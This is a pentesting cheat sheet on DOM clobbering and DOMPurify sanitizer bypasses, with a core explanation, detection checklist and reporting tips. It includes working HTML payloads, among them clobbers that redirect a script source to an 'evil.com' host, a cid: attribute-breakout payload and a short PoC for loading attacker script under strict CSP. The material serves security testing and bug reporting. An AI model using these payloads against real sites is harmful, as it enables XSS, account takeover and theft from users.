# DOM Clobbering (advanced) & Sanitizer Bypass

**What it is:** Inject **HTML only** (no JS — strict CSP or a sanitizer strips script) and use named DOM elements to overwrite JavaScript variables/globals the app relies on. Turns "harmless" HTML injection into XSS, config override, or a sanitizer bypass. High-severity when it defeats DOMPurify.

## Core mechanic
Named elements become properties on `document`/`window` and on their parents:
- `id=` and `name=` create global references: `<a id=x>` → `window.x` is that element.
- Only these can clobber via `name`: **`embed`, `form`, `iframe`, `image`, `img`, `object`**.
- Two elements with the same `id`/`name` become an **HTMLCollection** → index it (`x[0]`, `x[1]`).

## Basic clobbers
```html
<!-- clobber a global config flag the app reads -->
<a id=isAdmin>                       // if(window.isAdmin) → truthy element
<a id=config><a id=config name=url href="https://evil.com/x.js">   // config.url = the href string

<!-- overwrite getElementById target / expected element -->
<img name=getElementById>            // document.getElementById now returns the img (breaks/redirects logic)

<!-- 3-level nesting via iframe/form to reach nested props (config.api.host) -->
<iframe name=config srcdoc="<a id=api><a id=api name=host href=cid:evil>"></iframe>
```
`href`/`src` read as a **string** gives you attacker-controlled values into a sink → if that value hits `script.src`, `location`, `innerHTML` → XSS.

## Advanced clobbering (terjanq / cure53 techniques)
- **Unclosed-tag cloning:** `<a href=foo><form><a>` — after DOMPurify, browser tag-soup cloning duplicates the `<a>` preserving attributes → build multi-node clobbers the sanitizer thought it flattened.
- **HTMLCollection + `.value`/`.namedItem`:** stack elements so `x.y.z` resolves through collections to reach nested properties.
- **`document.forms` / form-property clobber:** a `<form>` with `<input id=attributes>` **overwrites `form.attributes`** — a sanitizer that iterates `element.attributes` to clean them now reads your fake property and skips real ones → attributes survive.

## DOMPurify-specific bypasses (2025)
- **`cid:` protocol** — DOMPurify permits `cid:` and does **not** URL-encode double-quotes in it → inject an encoded `"` that decodes at runtime to break out of the attribute:
```html
<a href="cid:&quot; onclick=alert(document.domain) x=&quot;">click</a>
```
- **`IN_PLACE` mode + form root (≤ 3.4.5)** — `DOMPurify.sanitize(root,{IN_PLACE:true})` where `root` is an `HTMLFormElement` carrying an event-handler attr (`onmouseover`) → **all attribute sanitization on that root is bypassed** (recent critical). Check the app's DOMPurify version + mode.
- **`attributes` clobber (above)** blinds the sanitizer's own attribute cleanup.
- **mXSS** namespace confusion (`<math>`/`<svg>`+`<style>`) — see `03-injection/02-xss.md`.

## Where to inject
Markdown/comment renderers with a sanitizer, "rich text" fields, email HTML, any place that runs DOMPurify/sanitizer then reads globals or attributes.

## 🎯 PoC pattern
1. App JS: `var s=document.createElement('script'); s.src=window.cfg.cdn; document.head.append(s);`
2. Inject (passes sanitizer, no `<script>`): `<a id=cfg><a id=cfg name=cdn href="https://evil.com/x.js">`
3. `window.cfg.cdn` now = `https://evil.com/x.js` → app loads attacker script → XSS under strict CSP.

## Detection
- [ ] Grep app JS for globals read without declaration: `window.X`, bare `config.`, `document.forms`, `getElementById` results used as data.
- [ ] Burp **DOM Invader** → "DOM clobbering" mode auto-finds clobberable sinks.
- [ ] Note the sanitizer + version; map to known bypasses.

## Impact
XSS under strict CSP / robust sanitizer (high), client config override, sanitizer bypass enabling stored XSS → ATO.

## Report notes
Show the injected HTML surviving the sanitizer + the clobbered global/attribute changing a JS decision (ideally fired XSS). Cite sanitizer version if a known bypass.

## Deep cuts — more clobber targets & delivery
- [ ] **Clobber `document.currentScript` / `document.all` / `window.globalThis`-read config** — libraries that read `document.currentScript.src` to locate assets can be pointed at your host.
- [ ] **Clobber sanitizer/config allowlists:** if the app builds a DOMPurify config from a global (`window.SANITIZE_CONFIG`, `ALLOWED_TAGS`), clobber it to widen the allowlist before content is sanitized.
- [ ] **Prototype-pollution + clobbering combo:** pollute `Object.prototype` so an undefined global resolves truthy, or so a merged config picks up a clobbered node (`09-advanced/02`).
- [ ] **`<template>` / declarative-shadow-DOM tricks:** content inside `<template>`/`shadowrootmode` can survive some sanitizers and still clobber on adoption.
- [ ] **Form-scoped clobber for double-submit CSRF:** clobber the element the app reads the CSRF token from, or `form.action`/`form.method`, to redirect a legit submission.
- [ ] **Where to look:** markdown/rich-text renderers, email HTML, comment systems, any `innerHTML` of user content followed by a `window.X`/attribute read; confirm the exact sanitizer + version and match a current bypass rather than assuming the latest is safe.

## Sources
terjanq "Clobbering the clobbered"; Kévin Mizu "Exploring DOMPurify: Bypasses" (mizu.re); PortSwigger DOM clobbering Academy; DOMPurify IN_PLACE form-root advisory.
